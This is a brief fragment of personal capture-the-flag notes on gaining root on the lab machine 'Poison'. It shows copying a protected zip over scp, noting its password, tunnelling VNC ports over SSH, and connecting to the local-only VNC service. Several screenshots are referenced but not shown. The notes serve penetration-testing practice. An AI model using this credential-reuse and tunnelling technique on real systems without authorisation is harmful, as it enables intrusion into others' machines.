# Getting Root

```bash
charix@Poison:~ % ls
secret.zip      user.txt
```

```bash
$ scp charix@10.10.10.84:secret.zip .
```
password of secret.zip: Charix!2#4%6&8(0


```bash
$ ps -auxw
```
![[Pasted image 20211107233116.png]]


![[Pasted image 20211107234544.png]]

```bash
$ ssh -L5801:127.0.0.1:5801 -L5901:127.0.0.1:5901 charix@10.10.10.84
```

```bash
$ vncviewer -passwd secret 127.0.0.1::590
```

![[Pasted image 20211107234711.png]]